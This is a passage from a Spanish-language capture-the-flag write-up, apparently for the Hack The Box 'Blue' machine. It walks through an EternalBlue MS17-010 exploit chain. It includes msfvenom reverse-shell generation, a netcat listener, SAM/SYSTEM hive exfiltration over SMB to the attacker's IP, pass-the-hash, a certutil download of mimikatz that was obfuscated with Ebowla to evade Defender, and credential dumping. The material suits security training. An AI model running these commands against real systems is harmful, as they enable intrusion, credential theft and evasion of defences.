+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msfvenom &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; windows/x64/shell_reverse_tcp &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; raw &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; payload.bin &lt;span class=&quot;nv&quot;&gt;EXITFUNC&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;thread &lt;span class=&quot;nv&quot;&gt;LHOST&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;10.10.14.9 &lt;span class=&quot;nv&quot;&gt;LPORT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;443
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Colocamos nuestra ip en LHOST y el puerto que queramos para la reverse shell, -o el nombre que queramos asignarle al payload&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-blue/payload.png&quot; alt=&quot;payload.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Luego de crear el payload hacemos un merge con cat de el archivo  sc_x64_kernel.bin y payload.bin generado anteriormente&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;sc_x64_kernel.bin payload.bin &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; exploit.bin
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-blue/merge.png&quot; alt=&quot;merge.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ahora procedemos a lanzar el scrript ms17_010_eternalblue.py, pero antes de lanzarlo nos ponemos en escucha con netcat&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;rlwrap nc &lt;span class=&quot;nt&quot;&gt;-nlvp&lt;/span&gt; 443
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ahora lanzamos el script para explotar la vulnerabilidad eternal blue&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python3 ms17_010_eternalblue.py 10.10.10.40 exploit.bin
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Si no funciona a la primera volver a intentar hasta que nos entable la conexión, y listo ya tendríamos acceso a la maquina victima.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-blue/acceso_a_la_maquina.png&quot; alt=&quot;acceso a la maquina.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Una vez con acceso a la maquina verificamos que tipo de usuario somos&lt;/p&gt;
+
+&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nf&quot;&gt;whoami&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-blue/whoami.png&quot; alt=&quot;whoami.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Vemos que somos nt authority\system, procedemos a buscar las flags, ya que en este caso somos un usuario con máximos privilegios y este tipo de vulnerabilidad ya nos otorga dichos privilegios, en otros casos tendremos que elevar privilegios.&lt;/p&gt;
+
+&lt;p&gt;Procedemos a buscar las flags, primero la de el user&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-blue/user.png&quot; alt=&quot;user.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Luego la de root&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-blue/root.png&quot; alt=&quot;root.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Listo con esto estaría completada la maquina, no obstante se harán un par de cosas extras como ejemplo que puedan servir para practicar y para otras maquinas.&lt;/p&gt;
+
+&lt;h1 id=&quot;escalada-de-privilegios&quot;&gt;Escalada de Privilegios&lt;/h1&gt;
+
+&lt;p&gt;Como ya lo mencionamos la vulnerabilidad explotada nos brinda los privilegios máximos como NT authority System y podemos hacer cualquier cosa.&lt;/p&gt;
+
+&lt;h1 id=&quot;extra&quot;&gt;Extra&lt;/h1&gt;
+
+&lt;p&gt;Como extra nos dirigiremos al directorio Temp&lt;/p&gt;
+
+&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nf&quot;&gt;cd&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Windows\Temp&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Nos crearemos un directorio llamado PostExploitation&lt;/p&gt;
+
+&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nf&quot;&gt;mkdir&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;PostExploitation&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;luego entramos en ese directorio&lt;/p&gt;
+
+&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nf&quot;&gt;cd&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;PostExploitation&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;El recurso sam y system normalmente están en uso por el sistema, el siguiente paso seria crear una copia de estos. Como poseemos máximos privilegios lo hacemos de la siguiente manera&lt;/p&gt;
+
+&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nf&quot;&gt;reg&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;save&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;HKLM\system&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;system.backup&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;reg&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;save&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;HKLM\sam&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sam.backup&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-blue/sam_y_system.png&quot; alt=&quot;sam y system.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ahora los vamos a trasladar a nuestro sistema para analizarlos, los copiamos en la carpeta content, los vamos a copiar utilizando impacket&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;impacket-smbserver smbFolder &lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;pwd&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-smb2support&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;iniciamos el recurso compartido en la carpeta content donde los copiaremos&lt;/p&gt;
+
+&lt;p&gt;Para pasar los archivos utilizamos el siguiente comando en la maquina victima&lt;/p&gt;
+
+&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nf&quot;&gt;copy&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sam.backup&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;\\10.10.14.9\smbFolder\sam&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;copy&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;system.backup&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;\\10.10.14.9\smbFolder\system&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;En este caso lo copiaremos a nuestro equipo solo como sam y haremos lo mismo para system.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-blue/sam_y_system_copy.png&quot; alt=&quot;sam y system copy.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ahora cerramos el impacket y ahi tendremos los archivos&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-blue/files.png&quot; alt=&quot;files.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Vamos a utilizar impacket-secretsdump de la siguiente manera, recordemos que no necesitamos colocar una ip porque ya los tenemos en local&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;impacket-secretsdump &lt;span class=&quot;nt&quot;&gt;-sam&lt;/span&gt; sam &lt;span class=&quot;nt&quot;&gt;-system&lt;/span&gt; system LOCAL
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-blue/dump.png&quot; alt=&quot;dump.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Aquí tendríamos lo que nos interesa, que son los hashes de los usuarios&lt;/p&gt;
+
+&lt;p&gt;Con esto verificamos si el hash es correcto&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;crackmapexec cmb 10.10.10.40 &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Administrator. -H '&lt;/span&gt;cdf51b162460b7d5bc898f493751a0cc&lt;span class=&quot;s1&quot;&gt;'
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;y nos pondrá Pwn3d! y con esto ya tendríamos como una persistencia y hacer cosas.&lt;/p&gt;
+
+&lt;p&gt;Por ejemplo dumpear lsa a ver si logramos ver algo en texto claro&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;crackmapexec cmb 10.10.10.40 &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Administrator. -H '&lt;/span&gt;cdf51b162460b7d5bc898f493751a0cc&lt;span class=&quot;s1&quot;&gt;' --lsa
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;No logramos ver nada interesante en texto claro entonces lo descartamos&lt;/p&gt;
+
+&lt;p&gt;Podemos operar para conectarnos a la maquina por ejemplo&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;impacket-psexec WORKGROUP/Adminnistrator@10.10.10.40 &lt;span class=&quot;nt&quot;&gt;-hashes&lt;/span&gt; :cdf51b162460b7d5bc898f493751a0cc
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Con esto lograríamos hacer pass the hash  y tener una pequeña persistencia porque ya tenemos el hash&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-blue/pass_the_hash.png&quot; alt=&quot;pass the hash.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ahora vamos a ver de que forma podemos obtener la contraseña, para ello vamos a utilizar mimikatz, primero lo localizamos en nuestro equipo y lo copiamos a la carpeta content&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;locate mimikatz.exe
+&lt;span class=&quot;nb&quot;&gt;cp&lt;/span&gt; /usr/share/mimikatz/x64/mimikatz.exe &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Luego utilizaremos una herramienta para burlar el defender y posibles detecciones en base a lo que nosotros subamos a la maquina victima.&lt;/p&gt;
+
+&lt;p&gt;Nos clonamos el siguiente repositorio&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;git clone https://github.com/Genetic-Malware/Ebowla
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Esta herramienta sirve para tratar de eludir posibles detecciones ya que juega con las propias variables de entorno de la maquina, para crear una muestra cifrada por decirlo o ofuscada, donde se emplea las propias variables de entorno del sistema donde una vez se ejecute descifrar la muestra y llegara a poder ejecutarlo.&lt;/p&gt;
+
+&lt;p&gt;Nos dirigimos a la carpeta Ebowla y modificaremos un par de cosas de el archivo genetic.config&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;output_type &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; GO
+payload_type &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; EXE
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;la parte que mas retocamos es la de variables de entorno [[ENV_VAR]] hay que tener cuidado porque si nos equivocamos con alguna de las variables de entorno existentes la muestra no la va a lograr interpretar porque recordemos que toma las variables de entorno de la propia maquina para que cuando subamos la muestra que esta cifrada a la hora de tratar de descifrar esa muestra para interpretarla como nos equivoquemos no va a interpretar nada.&lt;/p&gt;
+
+&lt;p&gt;Desde la maquina victima tomaremos las variables de entorno con los siguientes comandos&lt;/p&gt;
+
+&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nf&quot;&gt;echo&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;echo&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;computername&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;echo&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;homepath&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Y así para cada una una de las variables de entorno, recordemos que si una no la reporta no la ponemos para evitar problemas, también cuando mas variables de entorno coloquemos mejor, pero no necesitamos colocarlas todas.&lt;/p&gt;
+
+&lt;p&gt;Nos debería quedar algo así&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-blue/variables_de_entorno.png&quot; alt=&quot;variables de entorno.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Para compilar como python2 ya no tiene soporte tendríamos que instalarlo e instalar las de dependencias que nos den error hasta que ya podamos ejecutar el script&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python2 ebowla.py mimikatz.exe genetic.config
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Aquí le pasamos el archivo a cifrar y el archivito genetic.conf previamente configurado con las variables de entorno.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-blue/ebowla.png&quot; alt=&quot;ebowla.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Listo ya tendríamos el archivo en la carpeta output&lt;/p&gt;
+
+&lt;p&gt;Ahora vamos a compilar el archivo que nos genero en output&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./build_x64_go.sh output/go_symmetric_mimikatz.exe.go mimi.exe
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;le asignamos el nombre que queramos, en este caso lo llame mimi.exe, si todo sale bien nos pondrá esto, si nos da algún error solo instalar los paquetes necesarios.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-blue/mimi_encode.png&quot; alt=&quot;mimi encode.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ahora nos vamos a transferir el archivo con python3 por el puerto 80 a la maquina victima&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python3 &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; http.server 80
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ahora nos descargamos el archivo desde la maquina victima haciendo uso de certutil&lt;/p&gt;
+
+&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nf&quot;&gt;certutil.exe&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-urlcache&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-split&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;http://10.10.14.9/mimi.exe&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-blue/download_file.png&quot; alt=&quot;download file.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Listo ya tendríamos el archivo en la maquina victima&lt;/p&gt;
+
+&lt;p&gt;Ahora a ejecutar nuestro archivo&lt;/p&gt;
+
+&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nf&quot;&gt;mimi.exe&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-blue/mimikatz.png&quot; alt=&quot;mimikatz.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Listo nos funciono ahora vamos por  las credenciales&lt;/p&gt;
+
+&lt;p&gt;Lo hacemos de la siguiente manera&lt;/p&gt;
+
+&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nf&quot;&gt;privilege::debug&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sekurlsa::logonPasswords&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Si todo sale bien nos mostrara la credencial&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-blue/credentials.png&quot; alt=&quot;credentials.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Hay que tener en cuenta que a veces en entornos empresariales comprometes un equipo no privilegiado pero en la memoria consigues las credenciales de un administrador del dominio, y esto es importante ya que con esto tenemos acceso a todos los equipos de la red.&lt;/p&gt;
+
+&lt;p&gt;Listo con esto tendríamos varias maneras y caminos los cuales nos servirán mucho para otras maquinas, recuerden que la practica hace al maestro&lt;/p&gt;</content><author><name>ewor01</name></author><category term="SMB Enumeration" /><category term="Eternalblue Exploitation(MS17-010)" /><category term="Persistence" /><category term="Windows Defender Evasion" /><summary type="html">Blue es una maquina donde estaremos explotando la famosa vulnerabilidad eternalblue MS17-010, donde miraremos tecnicas de evasion de defender y un par de cosas mas.</summary></entry></feed>
